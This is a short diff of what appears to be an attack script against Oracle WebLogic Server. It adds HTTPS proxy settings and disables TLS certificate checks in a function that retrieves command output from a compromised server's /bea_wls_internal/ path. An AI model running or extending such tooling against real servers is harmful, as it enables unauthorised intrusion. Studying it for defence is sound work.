@@ -11,7 +11,7 @@ Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 
 Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server
 Modified by hanc00l
 '''
-proxies = None#{'http':'http://127.0.0.1:8080'}
+proxies = None#{'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
 timeout = 5
 '''
@@ -63,7 +63,7 @@ def get_output(target,output_file):
     #url增加时间戳避免数据是上一次的结果缓存
     output_url = 'http://{}/bea_wls_internal/{}?{}'.format(target,output_file,int(time.time()))
     try:
-        r = requests.get(output_url,headers = headers,proxies=proxies,timeout=timeout)
+        r = requests.get(output_url,headers = headers,proxies=proxies,timeout=timeout,verify=False)
         if r.status_code == requests.codes.ok:
             return (True,(r.text.strip()))
         elif r.status_code == 404:
